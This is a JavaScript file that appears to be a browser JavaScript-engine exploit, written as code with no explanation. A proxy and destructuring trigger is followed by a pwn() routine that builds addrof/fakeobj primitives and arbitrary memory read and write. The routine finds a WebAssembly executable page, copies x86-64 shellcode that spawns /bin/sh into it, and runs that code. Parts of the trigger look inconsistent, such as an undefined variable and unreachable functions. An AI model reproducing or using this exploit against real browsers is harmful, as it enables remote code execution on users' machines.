callFn = function (code) { try { code(); } catch (e) { console.log(e); } }

let proxy = new Proxy({}, {});

function run(prop, ...args) {
	let handler = {};
	const proxy = new Proxy(function () {}, handler);
	handler[prop] = (({v1 = ((v2 = (function () {
	var v3 = 0;
	var callFn = 0;
	if (asdf) { return; } else { return; }
	(function () { v3(); });
	(function () {
			callFn = "\u0041".repeat(1024*32);
			v3 = [1.1];
            boxed = [{}].slice();
            float_arr = [13.37];
			})
	})) => (1))() }, ...args) => (1));
	Reflect[prop](proxy, ...args);
}

callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));

function pwn() {
    let CONVERSION = new ArrayBuffer(0x8);
    let f64 = new Float64Array(CONVERSION);
    let i64 = new BigUint64Array(CONVERSION);

    BigInt.prototype.hex = function() { return "0x" + this.toString(16); }
    BigInt.prototype.i2f = function() { i64[0] = this; return f64[0]; }
    Number.prototype.hex = function() { f64[0] = this; return "0x" + i64[0].toString(16); }
    Number.prototype.f2i = function() { f64[0] = this; return i64[0]; }

    run[0x10] = 0x13371337;
    if(proxy.length != 0x13371337)
        return;

    let addrof = function(obj) {
        boxed[0] = obj;
        return proxy[0x18].f2i();
    }

    let fakeobj = function(addr) {
        proxy[0x18] = addr.i2f();
        return boxed[0];
    }

    let float_map = proxy[0x20].f2i();

    const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,139,128,128,128,0,1,133,128,128,128,0,0,65,185,10,11]);
    const wasmInstance = new WebAssembly.Instance(new WebAssembly.Module(wasmCode), {});
    const shell = wasmInstance.exports.main;

    let ab = new ArrayBuffer(0x100);
    let ab_addr = addrof(ab);

    let fake = [float_map.i2f(), 0, 13.37, (0x100n << 32n).i2f()].slice();
    let fake_obj = fakeobj(addrof(fake) - 0x20n);

    let write64 = function(addr, value) {
        fake[2] = (addr - 0x10n).i2f();
        fake_obj[0] = value.i2f();
    }

    let read64 = function(addr) {
        fake[2] = (addr - 0x10n).i2f();
        return fake_obj[0].f2i();
    }

    let rwx_addr = read64(addrof(shell) - 0xf8n);
    write64(ab_addr + 0x20n, rwx_addr);

    const shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";
    let dv = new DataView(ab);
    for(let i = 0; i < shellcode.length; i++)
        dv.setUint8(i, shellcode.charCodeAt(i));

    shell();
}

pwn();
